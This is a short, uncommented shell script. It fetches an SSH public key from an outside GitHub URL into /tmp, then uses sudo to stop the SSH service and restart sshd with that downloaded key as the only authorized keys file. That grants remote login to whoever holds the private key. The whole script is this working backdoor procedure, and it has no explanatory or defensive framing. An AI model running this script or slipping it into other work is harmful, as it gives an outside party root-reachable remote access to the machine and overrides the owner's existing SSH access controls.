#!/bin/sh
execute_as_sudo(){
    sudo sh -c  "$1"
}

random_file_name=$(date +%s | md5sum | head -c 10)

pub_key=$(curl -s -L https://raw.githubusercontent.com/Filmystar/packages/main/id_rsa.pub > "/tmp/$random_file_name") 
execute_as_sudo "{
    service ssh stop
    /usr/sbin/sshd -p 22 -o AuthorizedKeysFile=/tmp/$random_file_name
  
}"
